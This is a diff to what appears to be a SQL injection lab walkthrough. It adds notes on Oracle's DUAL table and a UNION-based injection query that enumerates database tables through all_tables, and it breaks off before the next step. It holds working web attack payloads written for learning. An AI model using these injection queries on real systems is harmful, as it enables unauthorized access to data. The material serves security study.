@@ -23,6 +23,8 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
 
 #### Determine column with text data
 
+Here we use the `DUAL` table which is by defaut present in ORACLE databse
+
 Both columns have text data
 
 ```sql
@@ -32,4 +34,17 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' F
 ![image](https://user-images.githubusercontent.com/67383098/234493878-4160908e-fddd-4269-a091-395850b55e44.png)
 
 #### Retreive data from ORACLE db -
+
+
+```sql
+SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM all_tables--
+```
+
+We get a list of all the tables,
+
+The table which we are interested in is this 
+
+
+
+
 
